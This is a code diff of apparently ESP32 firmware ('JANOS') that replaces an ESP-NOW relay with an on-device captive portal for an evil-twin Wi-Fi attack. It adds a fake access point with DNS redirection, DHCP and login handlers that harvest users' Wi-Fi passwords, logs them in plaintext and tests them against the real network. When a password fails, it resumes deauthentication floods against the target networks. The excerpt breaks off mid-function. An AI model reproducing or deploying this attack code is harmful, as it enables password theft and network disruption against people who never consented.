@@ -1,6 +1,7 @@
 // main.c
 #include <stdio.h>
 #include <string.h>
+#include <strings.h>
 #include <stdlib.h>
 #include <inttypes.h>
 #include <errno.h>
@@ -19,7 +20,6 @@
 #include "esp_wifi.h"
 #include "esp_event.h"
 
-#include "esp_now.h"
 #include "esp_mac.h"
 
 #include "esp_console.h"
@@ -31,6 +31,7 @@
 #include "driver/spi_master.h"
 #include "esp_vfs_fat.h"
 #include "sdmmc_cmd.h"
+#include <dirent.h>
 
 #include "driver/gpio.h"
 
@@ -43,8 +44,17 @@
 #include "mbedtls/entropy.h"
 #include "esp_timer.h"
 
+#include "esp_http_server.h"
+#include "esp_netif.h"
+#include "lwip/err.h"
+#include "lwip/sys.h"
+#include "lwip/netdb.h"
+#include "lwip/dns.h"
+#include "lwip/dhcp.h"
+
 //Version number
-#define JANOS_VERSION "0.0.5"
+#define JANOS_VERSION "0.1.0"
+
 
 #define NEOPIXEL_GPIO      27
 #define LED_COUNT          1
@@ -155,6 +165,7 @@ static target_bssid_t target_bssids[MAX_TARGET_BSSIDS];
 static int target_bssid_count = 0;
 static uint32_t last_channel_check_time = 0;
 static const uint32_t CHANNEL_CHECK_INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
+static volatile bool periodic_rescan_in_progress = false; // Flag to suppress logs during periodic re-scans
 
 // SAE Overflow attack task
 static TaskHandle_t sae_attack_task_handle = NULL;
@@ -162,6 +173,16 @@ static volatile bool sae_attack_active = false;
 
 // Wardrive task
 static TaskHandle_t wardrive_task_handle = NULL;
+
+// Portal state
+static httpd_handle_t portal_server = NULL;
+static volatile bool portal_active = false;
+static TaskHandle_t dns_server_task_handle = NULL;
+static int dns_server_socket = -1;
+
+// DNS server configuration
+#define DNS_PORT 53
+#define DNS_MAX_PACKET_SIZE 512
 
 // Dual-band channel list (2.4GHz + 5GHz like Marauder)
 static const int dual_band_channels[] = {
@@ -182,8 +203,6 @@ static const wifi_promiscuous_filter_t sniffer_filter = {
 static char wardrive_gps_buffer[GPS_BUF_SIZE];
 static wifi_ap_record_t wardrive_scan_results[MAX_AP_CNT];
 
-//Target (ESP32) MAC of the other device (ESP32):
-uint8_t esp32_mac[] = {0xCC, 0x8D, 0xA2, 0xEC, 0xEF, 0x38};
 
 
 /**
@@ -232,6 +251,15 @@ char * evilTwinSSID = NULL;
 char * evilTwinPassword = NULL;
 int connectAttemptCount = 0;
 led_strip_handle_t strip;
+static bool last_password_wrong = false;
+
+// SD card HTML file management
+#define MAX_HTML_FILES 50
+#define MAX_HTML_FILENAME 64
+static char sd_html_files[MAX_HTML_FILES][MAX_HTML_FILENAME];
+static int sd_html_count = 0;
+static char* custom_portal_html = NULL;
+static bool sd_card_mounted = false;
 
 
 // Methods forward declarations
@@ -245,6 +273,9 @@ static int cmd_show_sniffer_results(int argc, char **argv);
 static int cmd_show_probes(int argc, char **argv);
 static int cmd_sniffer_debug(int argc, char **argv);
 static int cmd_start_blackout(int argc, char **argv);
+static int cmd_start_portal(int argc, char **argv);
+static int cmd_list_sd(int argc, char **argv);
+static int cmd_select_html(int argc, char **argv);
 static int cmd_stop(int argc, char **argv);
 static int cmd_reboot(int argc, char **argv);
 static esp_err_t start_background_scan(void);
@@ -259,6 +290,15 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
 static void deauth_attack_task(void *pvParameters);
 static void blackout_attack_task(void *pvParameters);
 static void sae_attack_task(void *pvParameters);
+// DNS server task
+static void dns_server_task(void *pvParameters);
+// Portal HTTP handlers
+static esp_err_t root_handler(httpd_req_t *req);
+static esp_err_t portal_handler(httpd_req_t *req);
+static esp_err_t login_handler(httpd_req_t *req);
+static esp_err_t android_captive_handler(httpd_req_t *req);
+static esp_err_t ios_captive_handler(httpd_req_t *req);
+static esp_err_t captive_detection_handler(httpd_req_t *req);
 // Sniffer functions
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void sniffer_process_scan_results(void);
@@ -342,11 +382,7 @@ static void wifi_event_handler(void *event_handler_arg,
                                int32_t event_id,
                                void *event_data);
 
-static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len);
-static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status);
-
 static esp_err_t wifi_init_ap_sta(void);
-static esp_err_t espnow_init(void);
 static void register_commands(void);
 
 // --- Wi-Fi event handler ---
@@ -355,6 +391,7 @@ static void wifi_event_handler(void *event_handler_arg,
                                int32_t event_id,
                                void *event_data) {
     if (event_base == WIFI_EVENT) {
+        //MY_LOG_INFO(TAG, "WiFi event: %ld", event_id);
         switch (event_id) {
         case WIFI_EVENT_STA_CONNECTED: {
             const wifi_event_sta_connected_t *e = (const wifi_event_sta_connected_t *)event_data;
@@ -362,24 +399,182 @@ static void wifi_event_handler(void *event_handler_arg,
                      (const char*)e->ssid, e->channel,
                      e->bssid[0], e->bssid[1], e->bssid[2], e->bssid[3], e->bssid[4], e->bssid[5]);
             MY_LOG_INFO(TAG, "Wi-Fi: connected to SSID='%s' with password='%s'", evilTwinSSID, evilTwinPassword);
+            
+            // Mark password as correct
+            last_password_wrong = false;
+            
+            // If portal is active (Evil Twin attack), shut it down after successful connection
+            if (portal_active) {
+                MY_LOG_INFO(TAG, "Password verified! Shutting down Evil Twin portal...");
+                portal_active = false;
+                
+                // Stop DNS server task
+                if (dns_server_task_handle != NULL) {
+                    MY_LOG_INFO(TAG, "Stopping DNS server task...");
+                    
+                    // Wait for DNS task to finish (it checks portal_active flag)
+                    for (int i = 0; i < 30 && dns_server_task_handle != NULL; i++) {
+                        vTaskDelay(pdMS_TO_TICKS(100));
+                    }
+                    
+                    // Force cleanup if still running
+                    if (dns_server_task_handle != NULL) {
+                        vTaskDelete(dns_server_task_handle);
+                        dns_server_task_handle = NULL;
+                        if (dns_server_socket >= 0) {
+                            close(dns_server_socket);
+                            dns_server_socket = -1;
+                        }
+                        MY_LOG_INFO(TAG, "DNS server task forcefully stopped.");
+                    } else {
+                        MY_LOG_INFO(TAG, "DNS server task stopped.");
+                    }
+                }
+                
+                // Stop HTTP server
+                if (portal_server != NULL) {
+                    httpd_stop(portal_server);
+                    portal_server = NULL;
+                    MY_LOG_INFO(TAG, "HTTP server stopped.");
+                }
+                
+                // Stop DHCP server
+                esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+                if (ap_netif) {
+                    esp_err_t dhcp_ret = esp_netif_dhcps_stop(ap_netif);
+                    if (dhcp_ret != ESP_OK) {
+                        MY_LOG_INFO(TAG, "Failed to stop DHCP server: %s", esp_err_to_name(dhcp_ret));
+                    } else {
+                        MY_LOG_INFO(TAG, "DHCP server stopped.");
+                    }
+                }
+                
+                // Change WiFi mode from APSTA to STA only (disable AP)
+                esp_err_t mode_ret = esp_wifi_set_mode(WIFI_MODE_STA);
+                if (mode_ret == ESP_OK) {
+                    MY_LOG_INFO(TAG, "WiFi mode changed to STA only - AP disabled.");
+                } else {
+                    MY_LOG_INFO(TAG, "Failed to change WiFi mode: %s", esp_err_to_name(mode_ret));
+                }
+                
+                MY_LOG_INFO(TAG, "Evil Twin portal shut down successfully!");
+            }
+            
             applicationState = IDLE;
+            break;
+        }
+        case WIFI_EVENT_AP_STACONNECTED: {
+            const wifi_event_ap_staconnected_t *e = (const wifi_event_ap_staconnected_t *)event_data;
+            MY_LOG_INFO(TAG, "AP: Client connected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
+                       e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
+            
+            // Log DHCP lease information if available
+            esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+            if (ap_netif) {
+                esp_netif_ip_info_t ip_info;
+                esp_netif_get_ip_info(ap_netif, &ip_info);
+                MY_LOG_INFO(TAG, "AP IP: %lu.%lu.%lu.%lu", 
+                           ip_info.ip.addr & 0xFF,
+                           (ip_info.ip.addr >> 8) & 0xFF,
+                           (ip_info.ip.addr >> 16) & 0xFF,
+                           (ip_info.ip.addr >> 24) & 0xFF);
+                MY_LOG_INFO(TAG, "AP Gateway: %lu.%lu.%lu.%lu", 
+                           ip_info.gw.addr & 0xFF,
+                           (ip_info.gw.addr >> 8) & 0xFF,
+                           (ip_info.gw.addr >> 16) & 0xFF,
+                           (ip_info.gw.addr >> 24) & 0xFF);
+                MY_LOG_INFO(TAG, "AP Netmask: %lu.%lu.%lu.%lu", 
+                           ip_info.netmask.addr & 0xFF,
+                           (ip_info.netmask.addr >> 8) & 0xFF,
+                           (ip_info.netmask.addr >> 16) & 0xFF,
+                           (ip_info.netmask.addr >> 24) & 0xFF);
+                
+                // Wait a bit for DHCP to assign IP
+                vTaskDelay(pdMS_TO_TICKS(3000));
+                MY_LOG_INFO(TAG, "Waiting for client to make HTTP requests...");
+                
+                // Check if client got an IP address by checking DHCP lease
+                MY_LOG_INFO(TAG, "Checking if client received IP address...");
+                MY_LOG_INFO(TAG, "Client MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
+                           e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
+                
+                // Check if client got an IP address by trying to ping
+                MY_LOG_INFO(TAG, "If client got IP, it should be able to reach 172.0.0.1");
+                MY_LOG_INFO(TAG, "Client should try to access: http://172.0.0.1/");
+                MY_LOG_INFO(TAG, "Client should try Android detection: http://172.0.0.1/generate_204");
+                MY_LOG_INFO(TAG, "Client should try iOS detection: http://172.0.0.1/hotspot-detect.html");
+                MY_LOG_INFO(TAG, "Client should try RFC 8908 API: http://172.0.0.1/captive-portal/api");
+                
+                // DHCP server should be running
+                MY_LOG_INFO(TAG, "DHCP server should be running and assigning IP addresses");
+                
+                // Log DHCP server configuration
+                MY_LOG_INFO(TAG, "DHCP server is configured to assign IPs in range 172.0.0.2-172.0.0.254");
+                MY_LOG_INFO(TAG, "DNS server will redirect all queries to 172.0.0.1");
+                
+                // Check if client got an IP address by trying to ping
+                MY_LOG_INFO(TAG, "If client got IP, it should be able to reach 172.0.0.1");
+                MY_LOG_INFO(TAG, "Client should try to access: http://172.0.0.1/");
+                MY_LOG_INFO(TAG, "Client should try Android detection: http://172.0.0.1/generate_204");
+                MY_LOG_INFO(TAG, "Client should try iOS detection: http://172.0.0.1/hotspot-detect.html");
+                MY_LOG_INFO(TAG, "Client should try RFC 8908 API: http://172.0.0.1/captive-portal/api");
+                
+                // Check if client got an IP address
+                esp_netif_ip_info_t client_ip_info;
+                if (esp_netif_get_ip_info(ap_netif, &client_ip_info) == ESP_OK) {
+                    MY_LOG_INFO(TAG, "AP IP in hex: 0x%08lX", client_ip_info.ip.addr);
+                    
+                    // Calculate correct IP range for DHCP clients
+                    // ESP-IDF stores IP in little-endian format
+                    uint32_t base_ip = client_ip_info.ip.addr;
+                    uint32_t first_client_ip = (base_ip & 0x00FFFFFF) | 0x02000000;  // 172.0.0.2
+                    uint32_t last_client_ip = (base_ip & 0x00FFFFFF) | 0xFE000000;   // 172.0.0.254
+                    
+                    MY_LOG_INFO(TAG, "First client IP in hex: 0x%08lX", first_client_ip);
+                    MY_LOG_INFO(TAG, "Last client IP in hex: 0x%08lX", last_client_ip);
+                    
+                    MY_LOG_INFO(TAG, "DHCP client IP range: %lu.%lu.%lu.%lu - %lu.%lu.%lu.%lu", 
+                               first_client_ip & 0xFF,
+                               (first_client_ip >> 8) & 0xFF,
+                               (first_client_ip >> 16) & 0xFF,
+                               (first_client_ip >> 24) & 0xFF,
+                               last_client_ip & 0xFF,
+                               (last_client_ip >> 8) & 0xFF,
+                               (last_client_ip >> 16) & 0xFF,
+                               (last_client_ip >> 24) & 0xFF);
+                }
+            }
+            break;
+        }
+        case WIFI_EVENT_AP_STADISCONNECTED: {
+            const wifi_event_ap_stadisconnected_t *e = (const wifi_event_ap_stadisconnected_t *)event_data;
+            MY_LOG_INFO(TAG, "AP: Client disconnected - MAC: %02X:%02X:%02X:%02X:%02X:%02X", 
+                       e->mac[0], e->mac[1], e->mac[2], e->mac[3], e->mac[4], e->mac[5]);
             break;
         }
         case WIFI_EVENT_SCAN_DONE: {
             const wifi_event_sta_scan_done_t *e = (const wifi_event_sta_scan_done_t *)event_data;
-            MY_LOG_INFO(TAG, "WiFi scan completed. Found %u networks, status: %" PRIu32, e->number, e->status);
+            
+            if (!periodic_rescan_in_progress) {
+                MY_LOG_INFO(TAG, "WiFi scan completed. Found %u networks, status: %" PRIu32, e->number, e->status);
+            }
             
             if (e->status == 0) { // Success
                 g_scan_count = MAX_AP_CNT;
                 esp_wifi_scan_get_ap_records(&g_scan_count, g_scan_results);
-                MY_LOG_INFO(TAG, "Retrieved %u network records", g_scan_count);
                 
-                // Automatically display scan results after completion
-                if (g_scan_count > 0 && !sniffer_active) {
-                    print_scan_results();
+                if (!periodic_rescan_in_progress) {
+                    MY_LOG_INFO(TAG, "Retrieved %u network records", g_scan_count);
+                    
+                    // Automatically display scan results after completion
+                    if (g_scan_count > 0 && !sniffer_active) {
+                        print_scan_results();
+                    }
                 }
             } else {
-                MY_LOG_INFO(TAG, "Scan failed with status: %" PRIu32, e->status);
+                if (!periodic_rescan_in_progress) {
+                    MY_LOG_INFO(TAG, "Scan failed with status: %" PRIu32, e->status);
+                }
                 g_scan_count = 0;
             }
             
@@ -440,6 +635,38 @@ static void wifi_event_handler(void *event_handler_arg,
                 if (connectAttemptCount >= 3) {
                     ESP_LOGW(TAG, "Evil twin: Too many failed attempts, giving up and going to DEAUTH_EVIL_TWIN. Btw connectAttemptCount: %d ", connectAttemptCount);
                     applicationState = DEAUTH_EVIL_TWIN; //go back to deauth
+                    
+                    // Mark password as wrong for portal feedback
+                    last_password_wrong = true;
+                    
+                    // Resume deauth attack since password was wrong
+                    if (!deauth_attack_active && deauth_attack_task_handle == NULL) {
+                        MY_LOG_INFO(TAG, "Resuming deauth attack - password was incorrect.");
+                        
+                        // Set LED to red for deauth
+                        esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 0, 0);
+                        if (led_err == ESP_OK) {
+                            led_strip_refresh(strip);
+                        }
+                        
+                        // Start deauth attack in background task
+                        deauth_attack_active = true;
+                        BaseType_t result = xTaskCreate(
+                            deauth_attack_task,
+                            "deauth_task",
+                            4096,  // Stack size
+                            NULL,
+                            5,     // Priority
+                            &deauth_attack_task_handle
+                        );
+                        
+                        if (result != pdPASS) {
+                            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
+                            deauth_attack_active = false;
+                        } else {
+                            MY_LOG_INFO(TAG, "Deauth attack resumed successfully.");
+                        }
+                    }
                 } else {
                     ESP_LOGW(TAG, "Evil twin: This is just a disconnect, connectAttemptCount: %d, will try again", connectAttemptCount);
                     connectAttemptCount++;
@@ -457,23 +684,43 @@ static void wifi_event_handler(void *event_handler_arg,
     }
 }
 
-// --- ESP-NOW callbacks ---
-static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *data, int len) {
-    char msg[len + 1];
-    memcpy(msg, data, len);
-    msg[len] = '\0';
-
-    evilTwinPassword = malloc(len + 1);
+// --- Password verification function (used by portal) ---
+static void verify_password(const char* password) {
+    evilTwinPassword = malloc(strlen(password) + 1);
     if (evilTwinPassword != NULL) {
-        strcpy(evilTwinPassword, msg);
+        strcpy(evilTwinPassword, password);
     } else {
-        ESP_LOGW(TAG,"Malloc error 4 password");
+        ESP_LOGW(TAG,"Malloc error for password");
     }
 
-    MY_LOG_INFO(TAG, "Received from: %02X:%02X:%02X:%02X:%02X:%02X",
-             recv_info->src_addr[0], recv_info->src_addr[1], recv_info->src_addr[2],
-             recv_info->src_addr[3], recv_info->src_addr[4], recv_info->src_addr[5]);
-    MY_LOG_INFO(TAG, "Message: %s", msg);
+    MY_LOG_INFO(TAG, "Password received: %s", password);
+
+    // Stop deauth attack BEFORE attempting to connect
+    // This is crucial because deauth task switches channels which prevents stable STA connection
+    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping deauth attack to attempt connection...");
+        deauth_attack_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (deauth_attack_task_handle != NULL) {
+            vTaskDelete(deauth_attack_task_handle);
+            deauth_attack_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
+        }
+        
+        // Clear LED
+        esp_err_t led_err = led_strip_clear(strip);
+        if (led_err == ESP_OK) {
+            led_strip_refresh(strip);
+        }
+        
+        MY_LOG_INFO(TAG, "Deauth attack stopped.");
+    }
 
     //Now, let's check if it's a password for Evil Twin:
     applicationState = EVIL_TWIN_PASS_CHECK;
@@ -482,22 +729,14 @@ static void espnow_recv_cb(const esp_now_recv_info_t *recv_info, const uint8_t *
     wifi_config_t sta_config = { 0 };  
     strncpy((char *)sta_config.sta.ssid, evilTwinSSID, sizeof(sta_config.sta.ssid));
     sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1] = '\0'; // null-terminate
-    strncpy((char *)sta_config.sta.password, msg, sizeof(sta_config.sta.password));
+    strncpy((char *)sta_config.sta.password, password, sizeof(sta_config.sta.password));
     sta_config.sta.password[sizeof(sta_config.sta.password) - 1] = '\0'; // null-terminate
     esp_wifi_set_config(WIFI_IF_STA, &sta_config);
-    vTaskDelay(pdMS_TO_TICKS(2000));
-    MY_LOG_INFO(TAG, "Received connect command from ESP32 to SSID='%s' with password='%s'", evilTwinSSID, msg);
+    vTaskDelay(pdMS_TO_TICKS(500));
+    MY_LOG_INFO(TAG, "Attempting to connect to SSID='%s' with password='%s'", evilTwinSSID, password);
     connectAttemptCount = 0;
     MY_LOG_INFO(TAG, "Attempting to connect, connectAttemptCount=%d", connectAttemptCount);
     esp_wifi_connect();
-}
-
-static void espnow_send_cb(const esp_now_send_info_t *send_info, esp_now_send_status_t status) {
-    const uint8_t *mac_addr = send_info->des_addr;
-    MY_LOG_INFO(TAG, "Sent to %02X:%02X:%02X:%02X:%02X:%02X, status: %s",
-             mac_addr[0], mac_addr[1], mac_addr[2],
-             mac_addr[3], mac_addr[4], mac_addr[5],
-             status == ESP_NOW_SEND_SUCCESS ? "OK" : "ERROR");
 }
 
 // --- Wi-Fi initialization (STA, no connection yet) ---
@@ -550,26 +789,6 @@ static esp_err_t wifi_init_ap_sta(void) {
     return ESP_OK;
 }
 
-// --- Initialize ESP-NOW ---
-static esp_err_t espnow_init(void) {
-    
-    ESP_ERROR_CHECK(esp_now_init());
-    ESP_ERROR_CHECK(esp_now_register_recv_cb(espnow_recv_cb));
-    ESP_ERROR_CHECK(esp_now_register_send_cb(espnow_send_cb));
-
-
-    esp_now_peer_info_t peer = {
-        .peer_addr = {0},
-        .channel = 1,
-        .encrypt = false,
-    };
-    memcpy(peer.peer_addr, esp32_mac, 6);
-    if (esp_now_add_peer(&peer) != ESP_OK) {
-        ESP_LOGE(TAG, "Failed to add peer");
-    }
-    return ESP_OK;
-    MY_LOG_INFO(TAG, "Peer added");
-}
 
 // --- Start background scan ---
 static esp_err_t start_background_scan(void) {
@@ -626,8 +845,6 @@ static void save_target_bssids(void) {
         target_bssid_count++;
     }
     
-    MY_LOG_INFO(TAG, "Saved %d target BSSIDs for channel monitoring", target_bssid_count);
-    
     // Debug: Print saved target BSSIDs
     for (int i = 0; i < target_bssid_count; ++i) {
         MY_LOG_INFO(TAG, "Target BSSID[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
@@ -644,12 +861,16 @@ static wifi_ap_record_t quick_scan_results[QUICK_SCAN_MAX_APS];
 
 // Quick channel scan for target BSSIDs
 static esp_err_t quick_channel_scan(void) {
-    MY_LOG_INFO(TAG, "Starting quick channel scan for target BSSIDs...");
+    if (!periodic_rescan_in_progress) {
+        MY_LOG_INFO(TAG, "Starting quick channel scan for target BSSIDs...");
+    }
     
     // Use the main scanning function instead of quick scan
     esp_err_t err = start_background_scan();
     if (err != ESP_OK) {
-        MY_LOG_INFO(TAG, "Quick scan failed: %s", esp_err_to_name(err));
+        if (!periodic_rescan_in_progress) {
+            MY_LOG_INFO(TAG, "Quick scan failed: %s", esp_err_to_name(err));
+        }
         return err;
     }
     
@@ -661,16 +882,22 @@ static esp_err_t quick_channel_scan(void) {
     }
     
     if (g_scan_in_progress) {
-        MY_LOG_INFO(TAG, "Quick scan timeout");
+        if (!periodic_rescan_in_progress) {
+            MY_LOG_INFO(TAG, "Quick scan timeout");
+        }
         return ESP_ERR_TIMEOUT;
     }
     
     if (!g_scan_done || g_scan_count == 0) {
-        MY_LOG_INFO(TAG, "No scan results available");
+        if (!periodic_rescan_in_progress) {
+            MY_LOG_INFO(TAG, "No scan results available");
+        }
         return ESP_ERR_NOT_FOUND;
     }
     
-    MY_LOG_INFO(TAG, "Successfully retrieved %d scan records", g_scan_count);
+    if (!periodic_rescan_in_progress) {
+        MY_LOG_INFO(TAG, "Successfully retrieved %d scan records", g_scan_count);
+    }
     
     // Copy scan results to our buffer
     uint16_t copy_count = (g_scan_count < QUICK_SCAN_MAX_APS) ? g_scan_count : QUICK_SCAN_MAX_APS;
@@ -679,7 +906,9 @@ static esp_err_t quick_channel_scan(void) {
     // Update target channels based on scan results
     update_target_channels(quick_scan_results, copy_count);
     
-    MY_LOG_INFO(TAG, "Quick channel scan completed");
+    if (!periodic_rescan_in_progress) {
+        MY_LOG_INFO(TAG, "Quick channel scan completed");
+    }
     return ESP_OK;
 }
 
@@ -687,32 +916,36 @@ static esp_err_t quick_channel_scan(void) {
 static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan_count) {
     bool channel_changed = false;
     
-    MY_LOG_INFO(TAG, "Updating target channels with %d scan results", scan_count);
-    
-    // Log current g_selected_indices and their corresponding BSSIDs
-    MY_LOG_INFO(TAG, "Current g_selected_indices and BSSIDs:");
-    for (int i = 0; i < g_selected_count; ++i) {
-        int idx = g_selected_indices[i];
-        MY_LOG_INFO(TAG, "  g_selected_indices[%d] = %d -> BSSID: %02X:%02X:%02X:%02X:%02X:%02X, SSID: %s", 
-                   i, idx, g_scan_results[idx].bssid[0], g_scan_results[idx].bssid[1], g_scan_results[idx].bssid[2],
-                   g_scan_results[idx].bssid[3], g_scan_results[idx].bssid[4], g_scan_results[idx].bssid[5],
-                   g_scan_results[idx].ssid);
-    }
-    
-    // Debug: Print all scan results
-    for (int i = 0; i < scan_count; ++i) {
-        MY_LOG_INFO(TAG, "Scan result[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
-                   i, scan_results[i].ssid,
-                   scan_results[i].bssid[0], scan_results[i].bssid[1], scan_results[i].bssid[2],
-                   scan_results[i].bssid[3], scan_results[i].bssid[4], scan_results[i].bssid[5],
-                   scan_results[i].primary);
+    if (!periodic_rescan_in_progress) {
+        MY_LOG_INFO(TAG, "Updating target channels with %d scan results", scan_count);
+        
+        // Log current g_selected_indices and their corresponding BSSIDs
+        MY_LOG_INFO(TAG, "Current g_selected_indices and BSSIDs:");
+        for (int i = 0; i < g_selected_count; ++i) {
+            int idx = g_selected_indices[i];
+            MY_LOG_INFO(TAG, "  g_selected_indices[%d] = %d -> BSSID: %02X:%02X:%02X:%02X:%02X:%02X, SSID: %s", 
+                       i, idx, g_scan_results[idx].bssid[0], g_scan_results[idx].bssid[1], g_scan_results[idx].bssid[2],
+                       g_scan_results[idx].bssid[3], g_scan_results[idx].bssid[4], g_scan_results[idx].bssid[5],
+                       g_scan_results[idx].ssid);
+        }
+        
+        // Debug: Print all scan results
+        for (int i = 0; i < scan_count; ++i) {
+            MY_LOG_INFO(TAG, "Scan result[%d]: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d", 
+                       i, scan_results[i].ssid,
+                       scan_results[i].bssid[0], scan_results[i].bssid[1], scan_results[i].bssid[2],
+                       scan_results[i].bssid[3], scan_results[i].bssid[4], scan_results[i].bssid[5],
+                       scan_results[i].primary);
+        }
     }
     
     for (int i = 0; i < target_bssid_count; ++i) {
         if (!target_bssids[i].active) continue;
         
-        MY_LOG_INFO(TAG, "Checking target BSSID %s (current channel: %d)", 
-                   target_bssids[i].ssid, target_bssids[i].channel);
+        if (!periodic_rescan_in_progress) {
+            MY_LOG_INFO(TAG, "Checking target BSSID %s (current channel: %d)", 
+                       target_bssids[i].ssid, target_bssids[i].channel);
+        }
         
         // Find matching BSSID in scan results
         bool found = false;
@@ -723,11 +956,14 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
                 target_bssids[i].last_seen = esp_timer_get_time() / 1000;
                 found = true;
                 
-                MY_LOG_INFO(TAG, "FOUND: Target BSSID %s (%02X:%02X:%02X:%02X:%02X:%02X) found in scan results at index %d, channel: %d", 
-                           target_bssids[i].ssid, target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
-                           target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], j, scan_results[j].primary);
+                if (!periodic_rescan_in_progress) {
+                    MY_LOG_INFO(TAG, "FOUND: Target BSSID %s (%02X:%02X:%02X:%02X:%02X:%02X) found in scan results at index %d, channel: %d", 
+                               target_bssids[i].ssid, target_bssids[i].bssid[0], target_bssids[i].bssid[1], target_bssids[i].bssid[2],
+                               target_bssids[i].bssid[3], target_bssids[i].bssid[4], target_bssids[i].bssid[5], j, scan_results[j].primary);
+                }
                 
                 if (old_channel != target_bssids[i].channel) {
+                    // ALWAYS log channel changes, even during periodic re-scan
                     MY_LOG_INFO(TAG, "Channel change detected for %s: %d -> %d", 
                                target_bssids[i].ssid, old_channel, target_bssids[i].channel);
                     channel_changed = true;
@@ -736,12 +972,12 @@ static void update_target_channels(wifi_ap_record_t *scan_results, uint16_t scan
             }
         }
         
-        if (!found) {
+        if (!found && !periodic_rescan_in_progress) {
             MY_LOG_INFO(TAG, "Target BSSID %s not found in scan results", target_bssids[i].ssid);
         }
     }
     
-    if (channel_changed) {
+    if (channel_changed && !periodic_rescan_in_progress) {
         MY_LOG_INFO(TAG, "Channel changes detected, will resume deauth on new channels");
         MY_LOG_INFO(TAG, "Note: Using target_bssids[] directly for deauth attack to avoid index confusion");
     }
@@ -955,8 +1191,6 @@ int onlyDeauth = 0;
 static void deauth_attack_task(void *pvParameters) {
     (void)pvParameters;
     
-    MY_LOG_INFO(TAG,"Deauth attack task started.");
-    
     //Main loop of deauth frames sending:
     while (deauth_attack_active && 
            ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK))) {
@@ -979,7 +1213,8 @@ static void deauth_attack_task(void *pvParameters) {
         // Check if it's time for channel monitoring (every 5 minutes)
         // Only perform periodic re-scan during active deauth attacks (DEAUTH and DEAUTH_EVIL_TWIN)
         if ((applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) && check_channel_changes()) {
-            MY_LOG_INFO(TAG, "Performing periodic channel check...");
+            // Set flag to suppress logs during periodic re-scan
+            periodic_rescan_in_progress = true;
             
             // Set LED to yellow during re-scan
             esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 255, 0); // Yellow
@@ -989,17 +1224,15 @@ static void deauth_attack_task(void *pvParameters) {
             
             // Temporarily pause deauth for scanning
             esp_err_t scan_result = quick_channel_scan();
-            if (scan_result == ESP_OK) {
-                MY_LOG_INFO(TAG, "Channel check completed, resuming deauth");
-            } else {
-                MY_LOG_INFO(TAG, "Channel check failed, continuing with current channels");
-            }
             
             // Clear LED after re-scan (ignore errors if LED is in invalid state)
             led_err = led_strip_clear(strip);
             if (led_err == ESP_OK) {
                 led_strip_refresh(strip);
             }
+            
+            // Clear flag after re-scan completes
+            periodic_rescan_in_progress = false;
         }
         
         if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
@@ -1265,10 +1498,9 @@ static int cmd_start_blackout(int argc, char **argv) {
 }
 
 /*
-0) Sends the first network name over ESP-NOW to ESP32
-1) Starts a stream of deauth pockets sent to all target networks. 
-2) Listens for password to try over ESP-NOW
-3) When password arrives, stops deauth stream and attempts to connect to a network
+0) Starts captive portal to collect password
+1) Starts a stream of deauth packets sent to all target networks. 
+2) When password is entered in portal, stops deauth stream and attempts to connect to a network
 
 */
 static int cmd_start_evil_twin(int argc, char **argv) {
@@ -1290,6 +1522,8 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             applicationState = DEAUTH;
         } else {
             applicationState = DEAUTH_EVIL_TWIN;
+            // Reset password wrong flag for new attack
+            last_password_wrong = false;
         }
 
         const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
@@ -1300,23 +1534,190 @@ static int cmd_start_evil_twin(int argc, char **argv) {
             ESP_LOGW(TAG,"Malloc error 4 SSID");
         }
 
-        //send evil ssid to ESP32 via ESP-NOW
+        // Start portal before starting deauth attack
         if (!onlyDeauth) {
-            char msg[100];
-            sprintf(msg, "#()^7841%%_%s", evilTwinSSID);
-            esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
-            vTaskDelay(pdMS_TO_TICKS(100));
-            ESP_ERROR_CHECK(esp_now_send(esp32_mac, (uint8_t *)msg, strlen(msg)));
-            MY_LOG_INFO(TAG,"Evil twin: %s", evilTwinSSID);
+            MY_LOG_INFO(TAG,"Starting captive portal for Evil Twin attack on: %s", evilTwinSSID);
+            
+            // Get AP netif and stop DHCP to configure custom IP
+            esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+            if (!ap_netif) {
+                MY_LOG_INFO(TAG, "Failed to get AP netif");
+                applicationState = IDLE;
+                return 1;
